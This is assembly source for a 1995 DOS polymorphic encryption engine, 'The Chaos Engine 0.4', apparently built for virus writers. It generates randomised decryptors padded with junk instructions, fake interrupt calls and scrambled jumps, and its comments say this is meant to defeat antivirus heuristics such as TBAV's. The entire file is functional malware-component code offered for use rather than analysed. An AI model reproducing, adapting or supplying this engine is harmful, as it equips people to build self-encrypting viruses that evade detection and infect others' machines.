        radix   16

;*****************************************
;* T.H.E - C.H.A.O.S - E.N.G.I.N.E - 0.4 *
;*****************************************
;1995 - Sepultura - Australia
;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;on CALLing of TCE -
;;;AX = TCE Flags:1 - Pad To DECRYPTOR_LENGTH.
;;;               2 - Make Short Decryptor (No Junk).
;;;               4 - Add Segment Overide.
;;;
;;;CX = Length of Code to Encrypt.
;;;DX = Delta Offset.
;;;DS:SI = Code to encrypt (DS _MUST_ = CS).
;;;ES:DI = Location of Buffer to Create Decryptor in.
;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;ON RETURN:
;;;ES = DS = Segment of Decryptor / Encrypted Code
;;;DX = Pointer to Start of Code
;;;CX = Length of Code
;;;;;;;;;;;;;;;;;;;
;;;Flag EQUates

MAKE_SMALL      equ     1
PAD_TO_MAX      equ     2
ADD_SEG         equ     4

;;;;;;;;;;;;;;;;;;;
;;;W.H.A.T.E.V.E.R

DECRYPTOR_LENGTH        equ     190h
MAX_PADDING             equ     90h - 1f
length_1                equ     (offset int_tbl - offset one_byters)-1

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;REGISTER TABLE - INTEL STANDLE FORMAT

tce_AX                   equ    0000xB
tce_CX                   equ    0001xB
tce_DX                   equ    0010xB
tce_BX                   equ    0011xB
tce_SP                   equ    0100xB
tce_BP                   equ    0101xB
tce_SI                   equ    0110xB
tce_DI                   equ    0111xB

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;THe BeLoW InSTuCTiOn CaN KilL A MaN

db      '[TCE-0.4]',0

;*****************************************************
;*****************************************************
;*** The REAL _REAL_ START of THE CHAOS ENGINE 0.4 ***
;*****************************************************
;*****************************************************

tce:    push    ax,bx,bp
        push    di,si

        cld

        mov     tce_begin,di
        mov     tce_delta,dx
        mov     c_length,cx
        mov     tce_flags,ax
        call    clear_regs
        mov     B index_sub,0

        mov     B[offset more_junk],0b0
        test    W tce_flags,MAKE_SMALL
        if nz   mov B[offset more_junk],0c3

        push    si
        call    get_rand_1f
        add     ax,MAX_PADDING
        xchg    cx,ax
        call    more_junk

swap0:  mov     si,offset init_1
        lodsw
        call    binary
        jz      no_swap1
        xchg    ax,[si]
        mov     [si-2],ax

no_swap1:
        push    ax
        lodsw
        call    binary
        jnz     no_swap2
        xchg    ax,[si]
        mov     [si-2],ax

no_swap2:
        push    ax
        lodsw
        lodsw
        call    binary
        jz      build_code
        xchg    ax,[si]
        mov     [si-2],ax

build_code:
        pop     ax
        call    ax
        call    pad_10
        pop     ax
        call    ax
        call    pad_10
        call    W init_3
        call    pad_10
        call    gen_decrypt
        call    pad_8
        call    W init_4
        call    pad_8
        call    W init_5
        call    pad_10
        call    gen_loop
        call    pad_8

        test    W tce_flags,PAD_TO_MAX
        jz      no_padding

        mov     B[offset more_junk],0b0
        mov     cx,DECRYPTOR_LENGTH
        add     cx,tce_begin
        sub     cx,di
        call    more_junk

no_padding:
        mov     ax,di
        sub     ax,DECRYPTOR_LENGTH
        add     enc_index,ax
        mov     bx,W index_loc
        cmp     B index_sub,1
        if e    neg ax
        add     es:[bx],ax

        pop     si
        mov     cx,c_length
        rep     movsb
        mov     dx,tce_begin
        mov     ds,es
        call    encryptor
        mov     cx,di
        sub     cx,dx

        pop     si,di
        pop     bp,bx,ax
        ret

init_count:                     ;Initialises Count Register..
        call    get_unused_reg  ;Make Count Initialiser in Encryptor and
        cmp     al,tce_DX
        je      init_count
        mov     count_reg,al    ;Decryptor
        mov     bx,W c_length
        shr     bx,1
        mov     W enc_length,bx
        call    gen_mov_reg
        ret

init_index:                     ;Initialises Index Register..
        mov     ax,0ff          ;Makes Index Initialiser in Encryptor and
        call    get_rand        ;Decryptor..
        push    ax
        call    get_rand_7
        pop     ax
        if z    xor ax,ax
        mov     B index_off,al
        mov     bx,DECRYPTOR_LENGTH
        add     bx, tce_begin
        mov     W enc_index,bx
        add     bx, tce_delta
        cbw
        sub     bx,ax

get_index:
        call    get_unused_reg
        cmp     al,tce_BX
        jb      get_index
        mov     W index_num,ax
        mov     B index_reg,al
        mov     B index_set,1
        call    gen_mov_reg
        mov     B index_set,0
        ret

gen_decrypt:                    ;generates DECRYPTOR / ENCRYPTOR instruction
        mov     W loop_start,di
        call    pad_8
        mov     bl,B key_reg
        sal     bl,3
        call    get_rand_2
        add     ax,ax
        add     ax,offset enc_table
        xchg    si,ax
        lodsw
        call    binary
        if z    xchg ah,al
        push    ax
        cmp     si,offset enc_table + 2
        jne     no_carry_set
        mov     al,0f8
        call    binary
        if z    inc ax
        mov     B enc_cf,al
        stosb

no_carry_set:
        test    W tce_flags,ADD_SEG
        jz      no_seg_set
        mov     al,2e
        stosb

no_seg_set:
        pop     ax
        stosb
        mov     B enc_loop,ah
        mov     si,W index_num

        cmp     B index_reg,tce_BP
        je      encryptor_has_offset
        cmp     B index_off,0
        jne     encryptor_has_offset
        push    ax
        call    get_rand_7
        pop     ax
        jz      encryptor_has_offset
        add     si,index_tab_c
        lodsb
        or      al,bl
        stosb
        ret

encryptor_has_offset:
        add     si,index_tab_b
        lodsb
        or      al,bl
        mov     ah,B index_off
        or      al,bl
        stosw
        xchg    al,ah
        cbw
        call binary
        jnz     ret
        mov     al,ah
        stosb
        add     es:B[di-3],40
        ret

modify_key:                     ;Modify Key: XOR/ADD/SUB key_reg,xxxx
        call    get_rand_7
        jz      no_mod_key
        call    get_rand_2
        add     ax,offset modify_table
        xchg    si,ax
        lodsb
        mov     ah,al
        mov     al,81
        mov     W enc_mod_op,ax
        or      ah,B key_reg
        stosw
        call    get_any_rand
        stosw

no_mod_key:
        mov     W enc_mod_val,ax

        ret

inc_index:                      ;increase index by 2..
        call    binary          ;1 in 2 chance of ADD reg,2/SUB reg,-2
        jz      add_sub_index

        mov     al,B index_reg
        or      al,40
        stosb
        call    pad_8
        stosb
        ret

add_sub_index:
        mov     al,83
        stosb
        mov     ah,2
        mov     al,B index_reg
        or      al,0c0

        call    binary
        jnz     put_add_sub_index

        neg     ah
        or      al,0e8

put_add_sub_index:
        stosw
        ret

gen_loop:
        mov     al,B count_reg
        cmp     al,tce_CX
        jne     not_CX

        push    ax
        call    get_rand_7
        pop     ax
        jz      not_CX

        lea     bx,[di+2]
        mov     ax,W loop_start
        sub     ax,bx
        mov     ah,0e2
        call    binary
        jnz     no_loop_nz
        xchg    bp,ax
        jmp     short do_loop_nz

no_loop_nz:
        xchg    ah,al
        stosw
        ret

not_CX: xchg    bx,ax

        call    binary
        jz      count_add_sub

        mov     al,48
        or      al,bl
        stosb
        jmp     short zero_test


count_add_sub:
        mov     al,83
        stosb
        mov     ah,-1
        mov     al,bl
        or      al,0c0

        call    binary
        jnz     put_add_sub_count

        neg     ah
        or      al,0e8

put_add_sub_count:
        stosw
        xor     bp,bp
        push    ax
        call    get_rand_7
        pop     ax
        jz      nloop_nz

zero_test:
        call    pad_10
        xor     bp,bp
do_loop_nz:
        mov     al,B count_reg
        mov     bl,al
        sal     al,3
        or      al,bl
        xchg    ah,al
        mov     bh,ah
        call    get_rand_2
        add     ax,offset zero_test_a
        xchg    si,ax
        lodsb
        mov     ah,bh
        or      ah,0c0
        stosw

nloop_nz:
        lea     bx,[di+2]
        mov     ax,W loop_start
        sub     ax,bx
        or      bp,bp
        jnz     loop_nz
        mov     ah,075
        call    binary
        jnz     nnnn
        mov     B es:[di],0f8
        inc     di
        sub     ax,0fe01
        db      0a9

loop_nz:mov     ah,0e0


nnnn:   xchg    ah,al
        stosw
        ret

init_key:
        call    get_any_rand
        mov     W enc_key,ax
        xchg    bx,ax
        call    get_unused_reg
        mov     B key_reg,al

gen_mov_reg:
        call    binary
        jz      lea_mov

        or      al,0b8
        stosb
        xchg    ax,bx
        jmp     short put_mov_b

lea_mov:call    binary
        jz      zero_then_add

        sal     al,3
        or      al,06
        mov     ah,8d
        xchg    ah,al
        stosw
        xchg    ax,bx
        jmp     short put_mov_b

zero_then_add:          ;Zero Register (XOR/SUB reg,reg)
        push    bx      ;Then OR/XOR/ADD Value
        push    ax      ;or SUB -Value
        mov     ah,0c0
        or      ah,al
        sal     al,3
        or      ah,al
        mov     al,29
        call    binary
        if z    mov al,31
        stosw
        call    pad_10
        pop     bx
        call    get_rand_2
        add     ax,offset value_from_0
        xchg    si,ax
        lodsb
        call    binary
        jz      zero_then_sub

        or      al,bl
        mov     ah,81
        xchg    ah,al
        stosw
        pop     ax

put_mov_b:
        cmp    B index_set,01
        if e   mov W index_loc,di
        stosw
        ret

zero_then_sub:
        cmp     B index_set,01
        if e    mov     B index_sub,1
        mov     al,0e8
        or      al,bl
        mov     ah,81
        xchg    ah,al
        stosw
        pop     ax
        neg     ax
        jmp     short put_mov_b

pad_8:  push    ax              ;Sub Procedure to Pad Between 1 and 8 bytes
        call    get_rand_7
        inc     ax
        jmp     short padder

pad_10: push    ax
        call    get_rand_1f     ;Sub Procedure to Pad Between 8 and 16 bytes
        or      al,8
padder: xchg    cx,ax
        call    more_junk
        pop     ax
        ret


more_junk:
        mov     al,03
        call    get_rand_b
        jnz     mj0

        mov     B [offset code_jmp],083 ;Re-Enable Jumps
        mov     ax,cx                   ;else normal filler junk (1 in 16)
        cmp     ax,40
        if a    mov al,40
        call    get_rand_b
        xchg    bx,ax
        call    fill_jnk
        jmp     short mj2

mj0:                                    ;8 in 16 chance of some type of jump
        call    code_jmp


mj2:    jcxz    ret
        jmp     short more_junk


one_byte:                       ;GENERATES A ONE BYTE JUNK INSTRUCTION
        jcxz    ret
        mov     si,one_byters   ;FROM one_byters TABLE
        mov     al,length_1
        call    get_rand_b
        add     si,ax
        movsb
        dec     cx
        dec     bx
        ret

reg_op: call    get_rand_7      ;ANY OP unused_reg16,reg16..
        sal     al,3
        or      al,3
        xchg    dx,ax
        call    get_unused_reg
        sal     al,3
        mov     dh,al
        call    get_rand_7
do_op:  or      dh,al
        or      dh,0c0
        xchg    dx,ax
put_2:  cmp     bx,2
        jb      one_byte
        stosw
        dec     cx,2
        dec     bx,2
        ret


lea_reg:call    get_rand_7      ;LEA unused_reg,[BP/BX/SI/DI]
        cmp     al,6
        je      lea_reg

        xchg    dx,ax
        call    get_unused_reg
        sal     al,3
        or      al,dl
        mov     ah,08d
        xchg    ah,al

        jmp     short put_2

op_ax:  call    get_any_rand
        and     al,8
        or      al,5
        and     ah,3
        shr     ah,4
        or      al,ah

put_3:  cmp     bx,3
        jb      reg_op
        stosb
        call    get_any_rand
put_3b: stosw
        sub     cx,3
        sub     bx,3
        ret

mov_reg:call    get_unused_reg  ;MOV unused_reg16,xxxx
        or      al,0b8
        jmp     short put_3


op_reg_im:                      ;cmp/add/sub/adc/sbb/or/xor/and reg16,imm16
        cmp     bx,4
        jb      op_ax
        call    get_unused_reg
        mov     ah,81
        xchg    dx,ax
        call    get_rand_7
        sal     al,3
        or      ax,dx
        xchg    ah,al
        or      ah,0c0
        stosw
        call    get_any_rand
        stosw
        sub     bx,4
        sub     cx,4
        ret


code_jmp:
        cmp     cx,3
        jb      ret

        mov     B [offset code_jmp],0c3 ;Disable Jumps.This ensures Unchained
                                        ;(TBAV-J) and helps stops heuristics
        call    get_any_rand            ;else conditional jmp
        and     ax,1f0f                 ;between 4 and 43 bytse jmp length
        add     ah,4
        or      al,70                   ;conditional jmp instructions are 70
                                        ;--> 7f
        push    ax
        call    get_rand_1f
        pop     ax
        if z    mov al,0e3
        xor     bx,bx
        mov     bl,ah

        dec     cx,2
        cmp     bx,cx
        jb      put_jmp
        mov     bx,cx
        mov     ah,bl

put_jmp:stosw

fill_jnk:
        or      bx,bx
        jz      ret

        mov     al,((offset binary - offset junk_tbl)/2)-1
        call    get_rand_b
        add     ax,ax
        add     ax,offset junk_tbl
        xchg    si,ax
        lodsw
        call    ax
        jmp     short fill_jnk


pp_reg:                  ;generate PUSH reg / junk / POP reg
        cmp     bx,3
        jb      gen_int

        lea     ax,[bx-2]
        shr     ax,1
        call    get_rand
        xchg    ax,dx
        call    get_rand_7
        or      al,50
        stosb
        dec     cx
        dec     bx
        push    ax
        xchg    dx,ax
        sub     bx,ax
        push    bx
        xchg    bx,ax
        call    fill_jnk
        pop     bx
        pop     ax

        call    binary
        jz      use_same
        call    get_unused_reg
        or      al,50

use_same:
        or      al,8
        stosb
        dec     cx
        dec     bx
        ret


gen_int:cmp     bx,4
        jb      ret

        call    get_rand_2

        add     ax,ax
        add     ax,offset int_tbl
        xchg    si,ax
        lodsw
        mov     dx,0cdb4
        xchg    al,dl
        stosw
        xchg    dx,ax
        xchg    ah,al
        stosw
        sub     cx,4
        sub     bx,4
        ret

junk_tbl:       dw      offset  op_reg_im
                dw      offset  op_reg_im
                dw      offset  op_reg_im
                dw      offset  gen_int
                dw      offset  gen_int
                dw      offset  pp_reg
                dw      offset  pp_reg
                dw      offset  reg_op
                dw      offset  reg_op
                dw      offset  lea_reg
                dw      offset  lea_reg
                dw      offset  mov_reg
                dw      offset  op_ax
                dw      offset  one_byte

binary: push    ax
        mov     al,1
        call    get_rand_b
        pop     ax
        ret

get_rand_2:
        mov     al,2
        db      0a9

get_rand_7:
        mov     al,7
        db      0a9

get_rand_1f:
        mov     al,1f
        db      0a9

get_any_rand:                   ;return rnd number in AX between 0 and FFFE
        mov     al,0fe

get_rand_b:
        cbw

get_rand:                       ;returns random number in AX between 0 and AX
        push    cx,dx
        inc     ax
        push    ax
        in      ax,40
        xchg    cx,ax
        in      ax,40
        rol     ax,cl
        xchg    cx,ax
        in      ax,40
        xor     ax,cx
        adc     ax,1234
        org     $-2
last_rand       dw      0AAAA
        mov     last_rand,ax
        pop     cx
        xor     dx,dx
        cmp     cx,1
        adc     cx,0
        div     cx
        xchg    dx,ax
        or      ax,ax
        pop     dx,cx
        ret

one_byters:     cmc                     ;15 1 byte junk instructions
                cld
                std
                in      ax,dx
                in      al,dx
                lahf
                cbw
                nop
                aaa
                aas
                daa
                das
                inc     ax
                dec     ax
                xlat


int_tbl:        dw      0116    ;AH=01,INT16: Check Keyboard Buffer..
                dw      0216    ;AH=02,INT16: Get Keyboard States..
                dw      4d21    ;AH=4D,INT21: Get Program Terminate Status..
                dw      4d21    ;AH=4D,INT21: Get Program Terminate Status..
                dw      0d10    ;AH=0D,INT10: Get Video Info..
                dw      0b21    ;AH=0B,INT21: Check Keyboard Buffer..
                dw      002a
                dw      002a


clear_regs:     cwd
                mov     B index_reg,dl      ;Clears Register Tables
                mov     B key_reg,dl        ;(All Regs Free)..
                mov     B count_reg,dl
                ret

get_unused_reg: call    get_rand_7      ;Return an Unused Register..
                test    al,NOT tce_SP   ;But _NOT_ SP, or AX.
                jz      get_unused_reg
                cmp     al,index_reg
                je      get_unused_reg
                cmp     al,count_reg
                je      get_unused_reg
                cmp     al,B key_reg
                je      get_unused_reg
                ret


;**********************************************
;* The Encryptor (Built along with Decryptor) *
;**********************************************
encryptor:      mov     cx,1234
                org     $-2
enc_length      dw      0

                mov     bx,1234
                org     $-2
enc_index       dw      0

                mov     ax,1234
                org     $-2
enc_key         dw      0

enc_cf:         nop
enc_loop:       xor     [bx],ax

enc_mod_op      dw      0
enc_mod_val     dw      0

                inc     bx,2
                loop    enc_cf
                ret

;****************************
;* Data / Variables / Flags *
;****************************

init_1  dw      offset init_count
init_2  dw      offset init_key
init_3  dw      offset init_index

init_4  dw      offset inc_index
init_5  dw      offset modify_key

;* The Below is A table of Values to Be Used To Choose *
;* The Count Register, The Index Register, and The Reg *
;* to   save  SP   in   During   the  Decryptor   Loop *
;                             BX   BP SI DI     ;This Table is used To Build
index_tab_b:    db      0,0,0,47,0,46,44,45     ;The Decryptor Instruction
index_tab_c:    db      0,0,0,7,0,0,4,5         ;Same As Above
;                       SBB ADC XOR XOR ADD SUB
enc_table:      db      19, 11, 31, 31, 01, 29  ;The Decryptor Opcodes..

;                       AND OR TEST
zero_test_a:    db      21, 09,85

;                       SUB                     ;Opcodes to Modify the Key
modify_table:   db      0e8                     ;Register
;                       ADD XOR OR              ;Opcode to get A value
value_from_0:   db      0c0,0f0,0c8             ;from 0.

loop_start      dw      0       ;Postion for LOOP to Jump to..

index_num       dw      0
index_off       db      0       ;OFFSET of INDEX reference (i.e: [SI+XX]).
index_loc       dw      0       ;location in ES of index reference set
index_sub       db      0       ;Was index_reg set using 0 the sub -value?

index_reg       db      0       ;Table of Used Registers..
count_reg       db      0       ;used in GET_UNUSED_REG
key_reg         db      0
index_set       db      0

tce_flags       dw      0       ;Engines Flags
tce_delta       dw      0       ;Delta Offset
tce_begin       dw      0       ;Beginning
c_length        dw      0
end_tce:

